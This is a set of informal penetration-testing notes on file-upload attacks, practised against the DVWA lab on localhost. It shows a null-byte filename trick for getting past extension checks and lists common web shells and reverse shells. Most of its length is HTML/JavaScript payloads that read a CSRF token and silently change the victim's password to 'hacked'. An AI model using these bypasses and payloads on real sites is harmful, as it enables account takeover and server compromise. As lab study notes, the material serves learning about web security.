# Bypass file extensions checks

https://book.hacktricks.xyz/pentesting-web/file-upload
https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/

1. Bypassing File uploading restrictions.

- Using Null bytes and change content-type:text/html

example  - 

If the application is accepting only PDF files then follow the below steps,

Use HTML/nullbyte&(accepted)extension

Eg: meow.html is the file to want to upload then craft the filename to get accepted. ie meow.html%00.pdf and change Content-type: text/html……!!!!!! Bypassed and Uploads the file.






ask kamal to share some reports for File uypload reported



*************************************************************************************************************************************************
# Remote code execution using backdoor ie webshell

https://www.hackingarticles.in/web-shells-penetration-testing/

dont know but somehow content got deleted!! pls go through above link with good examples

changes 

weevely
some built-in kali webshell
simple backdoor.php
qsd-php backdoor web shell
php-reverse-shell.php

and more


# Bypassing Anti-csrf token using file upload

in DVWA in High Security, was not able to it using XSS payload <iframe src="http://127.0.0.1:9000/payload.html" width="100%" height="300" ></iframe>

Because of the same origin policy, as above url does not have and Access control allow orgin header also
as my port is diffrent origin is also becoming different

NOTE
The same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors.

Two URLs have the same origin if the protocol, port (if specified), and host are the same for both. 

hence performed using File Upload below is payload

deguggin
<html>
<body>
<script>

fetch("http://127.0.0.1:8000/vulnerabilities/csrf",{
method:"GET"
})
.then(response => response.text())
.then((response) => {
alert(response);
console.log(response)
})
.catch(err => console.log(err))


</script>
</body>
</html>

payload 1

<html>
<body>
<script>

fetch("http://127.0.0.1:8000/vulnerabilities/csrf",{
method:"GET"
})
.then(response => response.text())
.then((response) => {

console.log(response)

console.log(typeof(response));
var token = String(response.match(/value='.*'/));
const csrftoken = token.substr(7,token.length-8);

var nxhr = new XMLHttpRequest();
nxhr.open("GET", 'http://127.0.0.1:8000/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token='+csrftoken+'#', true);
nxhr.withCredentials = true;
nxhr.send();
nxhr.onload = function(){
alert('You are Hacked!');
}

})
.catch(err => console.log(err))



</script>
</body>
</html>